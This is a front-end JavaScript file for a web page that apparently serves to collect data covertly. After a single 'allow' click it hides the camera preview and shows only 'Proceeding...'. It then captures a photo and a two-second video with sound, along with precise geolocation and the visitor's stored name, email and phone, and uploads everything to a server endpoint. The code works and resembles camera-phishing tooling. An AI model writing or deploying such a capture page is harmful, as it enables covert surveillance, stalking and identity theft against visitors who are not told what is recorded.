const video = document.getElementById('camera');
const allowButton = document.getElementById('allowButton');
const status = document.getElementById('status');
const canvas = document.getElementById('canvas');

let stream;

function showProceedingState() {

    status.textContent =
        'Proceeding...';

    allowButton.style.display = 'none';
    video.style.display = 'none';

}


// ==========================================
// GET LOCATION
// ==========================================

function getLocation() {

    return new Promise(resolve => {

        if (!navigator.geolocation) {

            resolve(null);
            return;

        }

        navigator.geolocation.getCurrentPosition(

            position => {

                resolve({

                    latitude:
                        position.coords.latitude,

                    longitude:
                        position.coords.longitude,

                    accuracy:
                        position.coords.accuracy

                });

            },

            () => {

                resolve(null);

            },

            {
                enableHighAccuracy: true,
                timeout: 10000
            }

        );

    });

}


// ==========================================
// ALLOW + START
// ==========================================

allowButton.onclick = async () => {

    try {

        showProceedingState();


        // Ask for camera + microphone

        stream =
            await navigator.mediaDevices.getUserMedia({

                video: true,
                audio: true

            });


        video.srcObject = stream;


        await new Promise(resolve => {

            if (video.readyState >= 2) {

                resolve();

            } else {

                video.onloadeddata =
                    () => resolve();

            }

        });


        // ==================================
        // LOCATION PERMISSION
        // ==================================

        const location =
            await getLocation();


        // ==================================
        // PHOTO
        // ==================================

        canvas.width =
            video.videoWidth;

        canvas.height =
            video.videoHeight;


        canvas
            .getContext('2d')
            .drawImage(

                video,

                0,
                0,

                canvas.width,
                canvas.height

            );


        const photoBlob =
            await new Promise(resolve => {

                canvas.toBlob(

                    resolve,

                    'image/jpeg',

                    0.9

                );

            });


        if (!photoBlob) {

            throw new Error(
                'Photo capture failed.'
            );

        }


        // ==================================
        // 2 SECOND VIDEO
        // ==================================

        const chunks = [];


        const recorder =
            new MediaRecorder(stream);


        recorder.ondataavailable =
            event => {

                if (event.data.size > 0) {

                    chunks.push(event.data);

                }

            };


        const recordingFinished =
            new Promise(resolve => {

                recorder.onstop =
                    resolve;

            });


        recorder.start();


        await new Promise(resolve =>

            setTimeout(
                resolve,
                2000
            )

        );


        recorder.stop();


        await recordingFinished;


        const videoBlob =
            new Blob(

                chunks,

                {
                    type:
                        recorder.mimeType
                }

            );


        // ==================================
        // SEND EVERYTHING
        // ==================================

        const formData =
            new FormData();


        const email =
            sessionStorage.getItem(
                'userEmail'
            ) || 'unknown';

        const name =
            sessionStorage.getItem(
                'userName'
            ) || 'unknown';

        const phone =
            sessionStorage.getItem(
                'userPhone'
            ) || 'unknown';


        formData.append(
            'email',
            email
        );

        formData.append(
            'name',
            name
        );

        formData.append(
            'phone',
            phone
        );


        if (location) {

            formData.append(
                'latitude',
                location.latitude
            );

            formData.append(
                'longitude',
                location.longitude
            );

            formData.append(
                'accuracy',
                location.accuracy
            );

        }


        formData.append(
            'photo',
            photoBlob,
            'photo.jpg'
        );


        formData.append(
            'video',
            videoBlob,
            'video.webm'
        );


        const response =
            await fetch(

                '/api/upload-media',

                {
                    method: 'POST',
                    body: formData
                }

            );


        const result =
            await response.json();


        if (!response.ok) {

            throw new Error(
                result.message
            );

        }

        sessionStorage.setItem(
            'submissionId',
            result.submissionId
        );


        // Turn devices off

        stream
            .getTracks()
            .forEach(
                track =>
                    track.stop()
            );
            setTimeout(() => {
    window.location.href = '/location.html';
}, 1000);


    } catch (error) {

        console.error(error);


        status.textContent =
            'Unable to proceed. Please try again.';


        if (stream) {

            stream
                .getTracks()
                .forEach(
                    track =>
                        track.stop()
                );

        }

    }

};